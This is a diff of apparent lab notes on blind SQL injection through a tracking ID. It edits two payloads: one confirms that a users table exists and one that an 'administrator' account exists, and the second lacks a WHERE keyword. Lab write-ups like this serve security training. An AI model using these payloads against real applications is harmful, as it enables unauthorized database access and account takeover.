@@ -27,7 +27,7 @@ then figure out how to exploit the web app. For this lab we are going to focus o
 
 2. Confirm that we have a users table
 
-    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and (select 'x' from users LIMIT 1)='x'--'
+    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and (select 'x' from users LIMIT 1)='x'--
         ->select any random value (here we are choosing 'x') and LIMIT the entry value to 1 
         ->this is saying if there is a users table -> output the value 'x' for each entry in the users table -> if the users table has 5 entries then we should get
           5 rows with 'x' in them 
@@ -35,7 +35,7 @@ then figure out how to exploit the web app. For this lab we are going to focus o
 
 3. Confirm that the username 'administrator' exists in the database
 
-    'wj6FkJCkmttewQap' and (select username from users username='administrator')='administrator'--'
+    'wj6FkJCkmttewQap' and (select username from users username='administrator')='administrator'--
         ->select the username 'administrator' from the users table -> if it exists does it equal the string 'administrator' -> if it does it will be a TRUE statement which will return the
           'Welcome Back' message
         
